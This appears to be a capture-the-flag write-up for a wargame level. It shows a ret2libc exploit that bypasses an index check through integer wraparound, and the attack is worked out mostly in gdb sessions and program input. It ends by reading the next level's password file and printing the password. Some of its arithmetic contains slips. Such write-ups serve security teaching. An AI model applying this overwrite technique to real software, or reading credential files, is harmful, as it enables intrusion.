@@ -1,0 +1,253 @@
+level07 is a program to store numbers 
+
+there are 3 cmds : "store" , "read" and "quit"
+
+store function take an int and an index, then it store the int at the given index of a int buffer
+
+read command takes an index and print the int at this index
+
+the store command calls a function "store_numbers" we can exploit it and rewrite it's return address with libc system("/bin/sh") ret2libc
+
+we have to overflow the int buffer and overwrite eip register
+
+
+first we have to find the address of saved eip and the address of the buffer start
+
+to do so we will try to set a number at data[0]
+
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) r
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 911
+ Index: 0     
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+Input command: 
+
+this is impossible because the program check we dont input numbers at any index where x % 3 = 0 (0, 3, 6, 9, 12 ...)
+
+so we will try to overflow int since it's unsigned int the number 2147483648 = 0
+
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) r
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 911
+ Index: 2147483648
+ Completed store command successfully
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb)
+
+
+it worked now lets find this 911 in the stack
+
+(gdb) x/d $ebp
+0xffffd438:	-10712
+(gdb)
+0xffffd43c:	134514992
+(gdb)
+0xffffd440:	-11164
+(gdb)
+0xffffd444:	20
+(gdb)
+0xffffd448:	-134415680
+(gdb)
+0xffffd44c:	-134363372
+(gdb)
+0xffffd450:	152
+(gdb)
+0xffffd454:	-1
+(gdb)
+0xffffd458:	-10464
+(gdb)
+0xffffd45c:	-10552
+(gdb)
+0xffffd460:	0
+(gdb)
+0xffffd464:	911
+(gdb)
+
+by keep pressing enter it increment the print
+
+so lets test now with input in index 1
+
+(gdb) n
+Single stepping until exit from function read_number,
+which has no line number information.
+ Index: 0
+ Number at data[0] is 911
+0x08048930 in main ()
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+ Completed read command successfully
+Input command: store
+ Number: 912
+ Index: 1
+ Completed store command successfully
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) x/d $ebp
+0xffffd438:	-10712
+(gdb)
+0xffffd43c:	134514992
+(gdb)
+0xffffd440:	-11164
+(gdb)
+0xffffd444:	20
+(gdb)
+0xffffd448:	-134415680
+(gdb)
+0xffffd44c:	-134363372
+(gdb)
+0xffffd450:	152
+(gdb)
+0xffffd454:	-1
+(gdb)
+0xffffd458:	-10464
+(gdb)
+0xffffd45c:	-10552
+(gdb)
+0xffffd460:	0
+(gdb)
+0xffffd464:	911
+(gdb)
+0xffffd468:	912
+(gdb)
+
+
+works perfect !
+
+
+now the address of eip save we are in read_number so we next to go back to main
+
+(gdb) n
+Single stepping until exit from function read_number,
+which has no line number information.
+ Index: q
+ Number at data[0] is 911
+0x08048930 in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd630:
+ eip = 0x8048930 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd628, args: 
+ Locals at 0xffffd628, Previous frame's sp is 0xffffd630
+ Saved registers:
+  ebx at 0xffffd61c, ebp at 0xffffd628, esi at 0xffffd620, edi at 0xffffd624, eip at 0xffffd62c
+
+
+saved eip = 0xffffd62c
+data[0] = 0xffffd464
+
+so 
+
+ffffd62c - ffffd464 = 1c8 = 456
+
+so the saved eip of main is 456 byte after data[0] 
+
+since int are 4 byte it is 456 / 4 = 114 int after data[0]
+
+114 % 3 = 0 
+
+so we have to overwrite with int max overflow
+2147483648 = 0
+2147484648 + 114 = 2147483762 = index 114
+
+ lets try 
+ 
+
+ level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 414141
+ Index: 2147483762
+ Completed store command successfully
+Input command: read
+ Index: 114
+ Number at data[114] is 414141
+ Completed read command successfully
+Input command: quit
+Segmentation fault (core dumped)
+
+it works
+
+
+so now we will put the address of system at offset 114 then the address of string "/bin/sh"
+
+(gdb) find 0xf7e2c000, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) p system
+$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+so now we can exploit 
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384                   // address of system
+ Index: 2147483762                    // offset 114 with int max overflow
+ Completed store command successfully
+Input command: store
+ Number: 4160264172                   //address of "/bin/sh"
+ Index: 2147483764                    //offset 116 with int max overflow
+ Completed store command successfully
+Input command: quit                   //return to main saved eip (overwrote with system("/bin/sh"))
+$ cd ../level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ 
+
+
+
